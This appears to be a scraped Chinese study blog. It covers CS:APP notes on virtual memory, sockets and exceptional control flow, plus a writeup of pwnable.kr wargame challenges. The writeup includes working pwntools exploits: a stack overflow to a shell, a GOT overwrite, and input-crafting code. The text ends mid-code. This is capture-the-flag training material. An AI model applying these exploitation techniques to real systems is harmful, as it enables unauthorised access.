未缓存的：未缓存在当前物理内存中的已分配页。页表虚拟内存作为内存管理的工具操作系统为每个进程提供一个独立的页表，VM简化了链接和加载,代码和数据共享,以及应用程序的存储器分配。 简化链接。独立的地址空间允许每个进程的内存映像使用相同的基本格式，而不管代码和数据实际存放在物理内存的何处。 简化加载要把目标文件中。text和。data节加载到一个新创建的进程中，Linux加载器为代码和数据段分配虚拟页，把它们标记为无效的（即未被缓存的），将页表条目指向目标文件中适当的位置。加载器从不从磁盘到内存实际复制任何数据。在每个页被初次引用时，要么是CPU取址时引用的，要么是一条正在执行的指令引用一个内存位置时引用的，虚拟内存会按照需要自动的地调入数据页。 简化共享 简化内存分配Linux虚拟内存系统Linux虚拟内存区域Linux为每个进程维持一个单独的虚拟地址空间：内核虚拟存储器和进程虚拟存储器。下图强调记录一个进程中虚拟内存区域的内核数据结构。内核为系统中的每个进程维护一个单独的任务结构（源代码中的task_struct）。任务结构中的元素包含或者指向内核运行该进程所需要的所有信息（例如，PID、指向用户栈的指针、可执行目标文件的名子，以及程序计数器）。 任务结构中的一个条目指向mm_struct，它描述了虚拟内存的当前状态。我们感兴趣的两个字段时pgd和mmap，其中pgd指向第一级页表（页全局目录的基址），而mmap指向一个vm_area_structs（区域结构）的链表，其中每个vm_area_structs都描述了当前虚拟地址空间的一个区域。当内核运行这个进程时，就将pdg存放在CR3控制寄存器中。 vm_start:指向这个区域起始处。 vm_end:指向这个区域的结束处。 vm_prot:描述这个区域内包含的所有页的读写许可权限。 vm_flags:描述这个区域内的页面是与其它进程共享的，还是这个进程私有的（还描述了一些其它信息）。 vm_next:指向链表中下一个区域结构。存储器映射定义：Linux 通过将一个虚拟存储器区域与一个磁盘上的对象关联，以初始化这个虚拟存储器区域的内容。虚拟存储器区域可以映射到以下两种类型文件： Unix文件系统中的普通文件:一个区域可以映射到一个普通磁盘文件的连续部分。例如，一个可执行文件。文件区(section)被分成页大小的片，每一片包含一个虚拟页面的初始化内容。仅仅是初始化，虚拟页面此时还并未进入物理存储器，直到CPU第一次引用这个页面。 匿名文件匿名文件由内核创建，包含的全是二进制零。CPU第一次引用这样区域(匿名文件)的虚拟页面时，将存储器中牺牲页面全部用二进制零覆盖。并将虚拟页面标记为驻留在存储器中。注意在磁盘和存储器之间并没有实际的数据传送。又叫请求二进制零的页(demand-zero page)。再看共享对象 私有对象的写时复制 再看fork函数当fork函数被当前进程调用时，内核为新进程创建各种数据结构，并分配给它唯一的PID。为了给这个新进程创建虚拟内存，它创建了当前进程的mm_struct、区域结构和页表的原样副本。它将两个进程中的每个页面都标记为只读，并将两个进程中的每个区域结构都标记为私有的写时复制。 当fork在新进程中返回时，新进程现在的虚拟内存刚好和调用fork时存在的虚拟内存相同。当这两个进程中的任一个后来进行写操作时，写时复制就会创建新页面，因此，也就为每个进程保持了私有地址空间的抽象概念。 再看execve函数假设调用了execve(&quot;a.out&quot;,NULL,NULL);execve函数在当前进程中加载并运行包含在可执行目标文件a.out中的程序，用a.out代替了当前程序。 删除已存在的用户区删除当前进程虚拟地址的用户部分中已存在的区域结构。 映射私有区域为新程序的文本，数据，bss和栈区域创建新的区域结构。所有新的区域结构都是私有的，写时拷贝的。 文本和数据区域被映射到a.out文件中的文件和数据区。bss区域是请求二进制零，映射到匿名文件 映射共享区域 设置PC。使用mmap函数的用户级内存映射Linux进程可以使用mmap函数来创建新的虚拟内存区域，并将对象映射到这些区域中。1234567#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;void *mmap(void *start, size_t length, int port, int flags, int fd, off_t offset); 返回：若成功则为指向映射区域的指针，若出错则为-1。 munmap函数删除虚拟存储器的区域 123456#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;void *munmap(void *start,size_t length);返回：若成功则为0，若出错则为-1","tags":[]},{"title":"第十一章 网络编程","date":"2019-07-10T00:57:47.000Z","path":"year/07/10/cl6ewldbf005nj63fo66aqqc8/","text":"客户端-服务器编程模型每个网络应用都是基于客户端-服务器模型的。采用这个模型，一个应用是由一个服务器进程和一个或多个客户端进程组成。客户端-服务器模型中的基本操作是事务(transaction)。一个客户端-服务器事物由以下四步组成。 当一个客户端需要服务时，他就向服务器发送一个请求，发起一个事物。例如，当Web浏览器需要一个文件时，它就发送一个请求给Web服务器。 服务器收到请求后，解释它，并以适当的方式操作它的资源。例如，当Web服务器收到浏览器发出的请求后，它就读取一个磁盘文件。 服务器给客户端发送一个响应，并等待下一个请求。例如，Web服务器将文件发送回客户端。 客户端收到响应并处理它。例如，当Web浏览器收到来自服务器的一页后，就在屏幕上显示此页。 认识到客户端和服务器是进程，而不是常提到的机器或者主机，这是很重要的。 网络客户端和服务器通常运行在不同的主机上，并通过计算机网络的硬件和软件资源来通信。 对主机而言，网络是一种I/O设备，是数据源和数据接收方。 全球IP因特网因特网的客户端和服务器混合使用套接字接口函数和Unix I/O函数来进行通信。通常将套接字函数实现为系统调用，这些系统调用会陷入内核，并调用各种内核模式的TCP/IP函数。 主机集合被映射为一组32位的IP地址。 这组IP地址被映射为一组称为 因特网域名(Internet domain name) 的标识符。 因特网主机上的进程能够通过 连接(connection) 和任何其他因特网主机上的进程通信。IP地址IP地址存放在IP地址结构中123struct in_addr&#123; uint32_t s_addr; /*Address in network byte order (big-endian)&#125; 主机字节顺序与网络字节顺序互换 因为因特网主机可以有不同的主机字节顺序，TCP/IP为任意整数数据项定义了统一的网络字节顺序（大端字节顺序）。 1234567#include&lt;arpa/inet.h&gt;uint32_t htonl(uint32_t hostlong);uint16_t htons(uint26_t hostshort);//返回：网络字节顺序值uint32_t ntohl(uint32_t netlong);uint16_t ntohs(uint16_t netshort);//返回：主机字节顺序值 inet_pton函数将点分十进制字符串转换为二进制的网络字节顺序的IP地址，inet_ntop函数将一个二进制的网络字节序的IP地址转换为点分十进制。 123456#include&lt;arpa/inet.h&gt;int inet_pton(AF_INET,const char *src,void *dst);//返回：成功则为1，若src为非法点分十进制地址则为0，出错为-1const char *inet_ntop(AF_INET,const void *src,char *dst);//返回：成功则指向点分十进制字符串的指针，出错为NULL 因特网连接一个套接字是连接的一个端点。每个套接字都有相应的套接字地址，是由一个因特网地址和一个16位的整数端口组成的，用“地址：端口”来表示。 一个连接是由它两端的套接字地址唯一确定的。这对套接字地址叫做套接字对(socket pair) 套接字的地址结构从Linux内核的角度看，一个套接字就是通信的一个端点。从Linux程序的角度来看，套接字就是一个有相应描述符的打开文件。 1234567891011struct sockaddr_in &#123; uint16_t sin_family; /*Protocol family(always AF_INET)*/ uint16_t sin port; struct in_addr sin_addr; unsigned char sin_zero[8];&#125;//通用套接字结构struct sockaddr &#123; uint16_t sa_family; char sa_data[14];&#125; 我们可以通过下图理解各个函数。 socket函数客户端和服务器使用socket函数来创建一个套接字描述符(socket descriptor)。 12345#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;int socket(int domain, int type, int protocol); //返回:若成功则为非负描述符，若出错则为-1 如果想要使套接字称为连接的一个端点，就用如下硬编码的参数来调用socke函数：clientfd = Socket(AF_INMET, SOCKET_STREAM, 0);socket返回的clientfd描述符仅是部分打开的，还不能读写。如何完成打开套接字的工作，取决于我们是客户端还是服务器。 connect函数客户端通过调用connect函数来建立和服务器的连接。 1234#include &lt;sys/socket.h&gt;int connect(int clientfd, const struct sockadrr *addr, socklen_t addrlen); //返回：若成功为0，出错为-1； connect函数试图与套接字地址为addr的服务器建立一个因特网连接，其中addrlen是sizeof(sockaddr_in)。connect函数会阻塞，一直到成功连接或是发生错误。 bind函数剩下的套接字函数————bind、listen和accept，服务器用它们和客户端建立连接。 12345#include &lt;sys/socket.h&gt;int bind(int sockefd, const struct sockaddr *addr, socklen_t addrlen); //返回：成功返回0， 错误返回-1。 bind函数告诉内核将addr中的服务器套接字地址和套接字描述符sockfd联系起来。 listen函数客户端时发起连接请求的主动实体。服务器是等待来自客户端的连接请求的被动实体。默认情况下，内核会认为socket函数创建的描述符对应于主动套接字(active socket)，默认情况下，它存在于一个连接的客户端。服务器调用listen函数告诉内核，描述符是被服务器使用的，而不是客户端使用的。 accept函数服务器通过调用accept函数等待来自客户端的连接请求。 1234#include &lt;sys/socket.h&gt;int accept(int listenfd, struct sockaddr *addr, int *addrlen); //若成功则返回非负连接描述符，若出错则为-1 accept函数等待来自客户端的连接请求到达侦听描述符listenfd，然后在addr中填写客户端的套接字地址，并返回一个**已连接描述符(connected descriptor)，这个描述符可被来利用Unix I/O函数与客户端通信。","tags":[]},{"title":"异常控制流","date":"2019-07-09T02:58:28.000Z","path":"year/07/09/cl6ewldb50054j63f993gg6ip/","text":"现代系统通过使控制流发生突变来对这些情况做出反应。一般而言，我们把这些突变称为异常控制流(Exceptional Control Flow, ECF)。作为程序员，理解EFC很重要，这有很多原因: 理解EFC将帮助你理解重要的系统概念 理解EFC将帮助你理解应用程序时如何与操作系统交互的 理解EFC将帮助你编写有趣的新应用程序 理解EFC将帮助你理解并发 理解EFC将帮助你理解软件异常如何工作 8.1异常 异常(exception)* 就是控制流中的突变，用来相应处理器状态中的某种变化。在处理器中，状态被编码为不同的位和信号。状态变化称为事件(event)在任何情况下，当处理器检测到有事件发生时，他就会通过一张叫做异常表(exception table) 的跳转表，进行一个间接过程调用(异常)，到一个专门设计用来处理这类事件的操作系统子程序(异常处理程序(exception handler))。当异常处理程序完成处理后，根据引起异常的事件的类型，将会发生以下3种情况的一种： 处理程序将控制返回给当前指令Icuur，即当前事件发生时正在执行的指令。 处理程序将控制返回给Inext，如果没有发生异常将会执行的下一条指令。 处理程序终止被中断的程序。异常处理在运行时(当系统执行某个程序时)，处理器检测到发生了一个事件，并且确定了相对的异常号k。随后，处理器触发异常，方法是执行间接过程调用，通过异常表的表目k，转到相应的处理程序。异常的类别总结： 中断是异步发生的，是来自处理器外部的I/O设备的信号的结果。 陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做系统调用。 故障由错误情况引起，它可能能够被故障处理程序修正。 终止是不可恢复的致命错误造成的结果，通常是一些硬件错误。Linux/x86-64 异常与系统调用异常系统调用在x86-64系统上，系统调用是通过一条称为syscall的陷阱指令提供的，其参数通过寄存器来传递。例如一个hello world12345int main()&#123; write(1, \"hello, world\\n\",13); _exit(0);&#125; 下面是汇编版本,直接使用syscall指令来调用write和exit系统调用 123456789101112main: //First call write(1, &quot;hello, world\\n&quot;,13); movq $1, %rax //write is system call 1 movq $1, %rdi //Arg1: stdout has descriptor 1 movq $string, %rsi //Arg2: hello, world string movq &amp;len, %rdx //Arg3: string length syscall //Make the system call //Next, call _exit(0) movq $60, %rax //exit is system call 60 movq &amp;0, %rdi //Arg1: exit status is 0 syscall //Make the system call 进程进程的经典定义就是一个执行中程序的实例。系统中每个程序都运行在某个进程的上下文中(context)。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的代码和数据，它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。 每次用户通过向shell输入一个可执行目标文件的名字，运行程序时shell就会创建一个新的进程，然后在这个新进程的上下文中运行这个可执行目标文件。应用程序也能够创建新进程，然后在这个新进程的上下文中运行它们自己的代码或者其它的应用程序。 进程提供给应用程序的关键抽象： 一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占的使用处理器。 一个私有的地址空间，他提供一个假象，好像我们的程序独占地使用内存系统。进程控制获取进程 ID每个进程都有一个唯一的正数(非零)进程 ID(PID)。getpid函数返回调用进程的 PID。getppid函数返回它的父进程的PID(创建调用进程的进程)。12345#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;pid_t getpid(void);pid_t getppid(void); 创建和终止进程父进程通过调用fork函数创建一个新的运行的子进程。 12345#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;pid_t fork(void); 返回：子进程返回0，父进程返回子进程的PID，如果出错则为-1 父进程和子进程之间最大的区别在于它们有不同的PID。 一个使用fork创建子进程的父进程的示例。 123456789101112131415int main()&#123; pid_t pid; int x = 1; pid = Fork(); if(pid == 0)&#123; printf(\"child : x=%d\\n\", ++x); exit(0); &#125; /*Parent */ printf(\"parent: x=%d\\n\", --x); exit(0);&#125; 当在Unix系统上运行这个程序时，我们得到下面结果： 123linux&gt; ./forkparent: x=0child: x=2 这说明了fork： 调用一次返回两次。fork函数被父进程调用一次，但是却返回两次——一次是返回到父进程，一次是返回到新创建的子进程。 并发执行。父进程和子进程是并发运行的独立进程。内核能够以任意方式交替执行它们的逻辑控制流中的指令。在我们的系统上运行这个程序时，父进程先完成它的printf语句，然后是子进程。然而，在另一个系统上可能正好相反。 相同但是独立的地址空间。父进程和子进程对x所做的任何改变都是独立的，不会反应在另一个进程的内存中。这就是为什么当父进程和子进程调用他们各自的printf语句时，它们中的变量x会有不同的值。 共享文件加载并运行程序execv函数在当前进程的上下文中加载并运行一个程序。12345#include&lt;unistd.h&gt;int execcve(const char *filename, const char *argv[], const char *envp[]); 如果成功，则不返回，如果错误则返回-1 argv变量指向一个以null结尾的指针数组，其中每个指针都指向一个参数字符串。envp变量指向一个以null结尾的指针数组，其中每个指针指向一个环境变量字符串，每个串都是形如”name=value”的名字-值对。 进程是执行中程序的一个具体的实例；程序总是运行在某个进程的上下文中。fork函数在新的子进程中运行相同的程序，新的子进程是父进程的一个复制品。execve函数在当前进程的上下文中加载并运行一个新的程序。它会覆盖当前进程的地址空间，但没有创建一个新的进程。新的程序仍然有相同的pid，并且继承调用execve函数时已打开的所有文件描述符。","tags":[]},{"title":"pwnable.kr第一部分writeup","date":"2019-07-06T14:38:21.000Z","path":"year/07/06/cl6ewldad0036j63ftc6kfscd/","text":"pwnable.kr上的题相对而言还是比较友好的，最近刷一下上面第一部分的题查漏补缺吧 fod 思路：1.先查看源码 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(\"pass argv[1] a number\\n\"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf))&#123; printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); &#125; printf(\"learn about Linux file IO\\n\"); return 0;&#125; 2.只要我们能够执行system(‘/bin/cat flag’)函数，我们就可以查看到falg里面的内容，所以我们要找到可以执行system函数的条件，也就是buf里面的内容是”LETMEWIN\\n”。接下来的任务就是找buf何来。 read()中从fd文件符读32字节，fd即为文件操作符，只有当fd=0时我们才能通过输入控制，所以使argv[1]=’0x1234’ 即可。 exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)p=s.process(argv=['./fd','4660'],executable='./fd')p.sendline('LETMEWIN')p.interactive() collison 思路：1.有源码先看源码 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(\"passcode length should be 20 bytes\\n\"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(\"/bin/cat flag\"); return 0; &#125; else printf(\"wrong passcode.\\n\"); return 0;&#125; 2.先看代码结构：有两个函数，main()和check_password()，先看main()找到关于flag的语句，当hashcode等于将第二个参数传入check_password后的返回值时，拿到flag，hashcode已给出，分析check_password()即可，​ int* ip = (int*)p; 此句为理解关键，将char类型指针强转为int型，ip每加一移动4个字节，所以题意为将输入的20个字节的参数分为5组，累加后等于0x21dd09ec即可3.计算器：0x01010101 * 4 +0x1dd905e8 = 0x21dd09ec （看网上说有坏字符的影响，但这么多数，随便选一个也可以了吧。。。。） exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='col',password='guest',port=2222)str=p32(0x01010101)*4 + p32(0x1dd905e8)p=s.process(argv=['./col',str],executable='./col')p.interactive() bof 思路：1.有源码先看源码 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf(\"overflow me : \"); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system(\"/bin/sh\"); &#125; else&#123; printf(\"Nah..\\n\"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 2.看到有system函数，并且还有一个gets函数。于是可以利用这个gets函数对输入长度不加限制的条件将key的值覆盖为0xcafebabe。3.详细原理参见ctfwif栈溢出基本原理 exp: 12345from pwn import * s=remote('pwnable.kr',9000)payload='A'*0x34 + p32(0xcafebabe)s.sendline(payload)s.interactive() flag 思路：1.没有给源码，只有一个elf文件。拖进IDA后发现函数少的可怜，f5也没法使用（基本是加壳了），再看hex-view发现一句话this file is packed with the UPX…….很明显，这题需要upx的知识储备，寻找谷歌百度 ，发现文件被Upx方式加壳，需要解壳。(我实在ubuntu虚拟机上直接安装upx工具后执行upx -d 文件名 命令就可以成功脱壳) 2.之后再把它放进ida中，f5看源码得知他要把flag复制进malloc()里，但是我们可以其实可以直接双击flag直接看注释得知flag…..可能是bug…. 或者在gdb里也可以直接在传递flag给rdx的指令后下个断点，然后在已字符串形式查看rdx的值即可（如下图） password 思路：1.有源码先看源码 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); &#125; else&#123; printf(\"Login Failed!\\n\"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name);&#125;int main()&#123; printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; &#125; 2.这题有点小难度：（首先应注意到welcome()和login()同在main()里且之间没有多余操作，所以他们ebp应该一样。）第一个思路是直接把system()的地址放进welcome()的ret里，后来发现name虽然限制了为100，但是name偏移了70H，失败。第二个思路是看passcode1和passcode2的地址，通过welcome中的name设计数据来控制他们的值：有两个地方行不通：(1)passcode2与name的偏移大于100 。 (2)passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9）即可，然而且不论这两个地址是否是可写的，至少00字节的存在就因为截断而打消念想了。3.这个时候就需要查新的资料和方法了，通过理解plt表和got表诞生了一种新的方法，双重scanf()连续修改，在welcome()的scanf()利用name设计passcode1（需先确定passcode1的地址相对name的偏移）的值，将其值设为fflush()的got表地址，在login()的第一个scanf()向passcode1所指向的地址（Got表中原本写的是调用flush()指令的地址）改为调用system函数指令的地址，所以之后调用fflush()的时候就会调用system（）。 exp: 123456from pwn import *s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')p=s.process('./passcode')payload='a'* 0x60 + '\\x04\\xa0\\x04\\x08' + '134514147'p.sendline(payload)p.interactive() exp需注意的地方：应数是输入给scanf 有固定格式，不能随便输入，例如%d只能为十进制整数，将134514147换成0x080485e3则不对。 另：这位大佬的writeup值得一看 random 思路：1.先看源码 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; &#125; printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0;&#125; 2.明显看出rand()的种子为固定的，所以其值也为固定的值，自己写一个程序跑一下就可以得出其结果，然后key = random ^ 0xdeadbeef得出结果 exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='random',port=2222,password='guest')p=s.process('./random')p.sendline('3039230856')p.interactive() input 思路：1.有源码分析源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf(\"socket error, tell admin\\n\"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf(\"bind error, use another port\\n\"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf(\"accept error, tell admin\\n\"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0;&#125; 这道题主要考察了5种输入方式，很考验linux编程功底，没办法只能一个一个查知识点了 stage112345// argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); 这部份很明显，我们需要执行这个input的时候有100个参数，并且第65个参数（即A的ascii码值）是”\\x00”，第66个参数是”\\x20\\x0a\\x0d”。然而我们会发现由于”\\x00”的截断和”\\x20\\x0a\\x0d”中又有换行符回车空字符这种东西，所以在命令行里这个参数在输入时会被截断，所以我们只能用写一个C语言文件编译执行execve函数来执行这个input文件。让我们在tmp文件夹内创建一个.c文件 123&gt;mkdir /tmp/xxx&gt;cd /tmp/xxx&gt;touch input_argvs.c 下面是这部分exp 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main()&#123; int i; /*stage1 looking for 100 arguments we need one extre space at end*/ char *args[101] = &#123;&#125;; for(i=0; i&lt;101; i++)&#123; args[i] = \"A\"; &#125; args['A'] = \"\\x00\"; args['B'] = \"\\x20\\x0a\\x0d\"; args[100] = NULL; execve(\"/home/input2/input\", args, NULL);&#125; 编译执行后我们可以发现stage1 clear stage21234567// stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); 第一个read中fd为0，这个在fd中已经见过，但对比的”\\x00\\x0a\\x00\\xff”字符串无法通过输入；而第二个read中的fd为2，表示stderr，对比”\\x00\\x0a\\x02\\xff”，stderr更是没有办法从命令行输入。因此只能IO重定向。所以我们需要fork一个子进程，然后通过pipe即可。 123pid_t childpid;int pipe_stdin[2];int pipe_stderr[2]; 管道有两个“端”，一个用于读取，一个用于写入，这就是数组长度为2的原因。每个末端都有一个文件描述符，一个用于读取，一个用于写入。调用pipe每个管道会创建管道的读写端。 12345// call pipe() on both pipesif (pipe(pipe_stdin) &lt; 0 || pipe(pipe_stderr) &lt; 0) &#123; perror(\"oh no\\n\"); exit(1);&#125;; 之后我们需要调用fork()来创建一个新的进程，并且将进程PID返回给childpid，然后检查是否成功。 123456// fork the processif((childpid = fork()) &lt; 0)&#123; perror(\"fork failed, oop\"); exit(1);&#125; 现在我们可以通过childpid的值判断当前活动的进程。再次强调 如果父进程想从子进程接受数据，那么它应该关闭fd1，子进程应该关闭fd0如果父进程想向子进程传送数据，那么它应该关闭fd0，子进程应该关闭fd1由于描述符在父进程和子进程之间共享，所以我们应该始终确保关闭那些无关的管道端 我们可以让子进程将期望值（“\\ x00 \\ x0a \\ x00 \\ xff”和“\\ x00 \\ x0a \\ x02 \\ xff”）写入两个管道，这意味着首先我们需要关闭读取端。 else的情况表示父进程需要关闭管道的写入端。Dup2将文件描述符重新映射。 12345678910111213141516171819202122232425// child process can close input side of pipe and write expected valuesif(childpid == 0)&#123; /* Child process closes up input side of pipe */ close(pipe_stdin[0]); close(pipe_stderr[0]); write(pipe_stdin[1], \"\\x00\\x0a\\x00\\xff\", 4); write(pipe_stderr[1], \"\\x00\\x0a\\x02\\xff\", 4); return 0;&#125;else&#123; /* parent process can close up output side of pipe, connect it to stdin and stderr, and then close the input side and call/home/input2/input */ close(pipe_stdin[1]); close(pipe_stderr[1]); dup2(pipe_stdin[0],0); dup2(pipe_stderr[0],2); close(pipe_stdin[0]); close(pipe_stderr[0]); execve(\"/home/input2/input\", args, NULL);&#125; 现在stage2也通过了 stage3在第三关，我们只需要设置env(环境变量)就行了 12if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); 我们的解决方法是在执行execve函数时加上env参数就行了 123char *env[2] = &#123;\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\", NULL&#125;;execve(\"/home/input2/input\", args, env); stage4第四关是读取指定文件里的内容，并且让里面的内容符合要求，我们该怎么做呢？ 1234567// fileFILE* fp = fopen(\"\\x0a\", \"r\");if(!fp) return 0;if( fread(buf, 4, 1, fp)!=1 ) return 0;if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0;fclose(fp);printf(\"Stage 4 clear!\\n\"); 我们只需要创建题目要求的文件，并向里面写指定的文件内容就行了。 1234//size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)FILE* fp = fopen(\"\\x0a\", \"w\");fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, fp);fclose(fp); 现在第四关也同过了 stage5下面是第五关的代码: 12345678910111213141516171819202122232425// networkint sd, cd;struct sockaddr_in saddr, caddr;sd = socket(AF_INET, SOCK_STREAM, 0);if(sd == -1)&#123; printf(\"socket error, tell admin\\n\"); return 0;&#125;saddr.sin_family = AF_INET;saddr.sin_addr.s_addr = INADDR_ANY;saddr.sin_port = htons( atoi(argv['C']) );if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf(\"bind error, use another port\\n\"); return 1;&#125;listen(sd, 1);int c = sizeof(struct sockaddr_in);cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);if(cd &lt; 0)&#123; printf(\"accept error, tell admin\\n\"); return 0;&#125;if( recv(cd, buf, 4, 0) != 4 ) return 0;if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0;printf(\"Stage 5 clear!\\n\"); Ohhh,我的天，涉及到了我的知识盲区，所以先放一放，我先补一下知识。了解了一些知识以后我们可以看出，这段代码是服务器端的，因此我们只需要创建一个与其结构相似的客户端套接字并传输数据就ok了。 12345678910111213141516171819202122232425// Stage 1 addition: args['C'] = \"5001\";// Stage 5sleep(5);int sd, cd;struct sockaddr_in saddr;sd = socket(AF_INET, SOCK_STREAM, 0);if(sd == -1)&#123; printf(\"socket error, tell admin\\n\"); return 0;&#125;saddr.sin_family = AF_INET;saddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");saddr.sin_port = htons(atoi(args['C']));if(connect(sd, (struct sockaddr *)&amp;saddr, sizeof(saddr))&lt;0)&#123; printf(\"\\n Error : Connect Failed \\n\"); return 1;&#125;write(sd, \"\\xde\\xad\\xbe\\xef\", 4); close(sd); 全部的writeup1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main()&#123; int i; /*stage1 looking for 100 arguments we need one extre space at end*/ char *args[101] = &#123;&#125;; for(i=0; i&lt;101; i++)&#123; args[i] = \"A\"; &#125; args['A'] = \"\\x00\"; args['B'] = \"\\x20\\x0a\\x0d\"; args['C'] = \"5001\"; args[100] = NULL; //stage3 char *env[2] = &#123;\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\", NULL&#125;; //stage4 FILE *fp; fp = fopen(\"\\x0a\", \"w\"); fwrite(\"\\x00\\x00\\x00\\x00\", 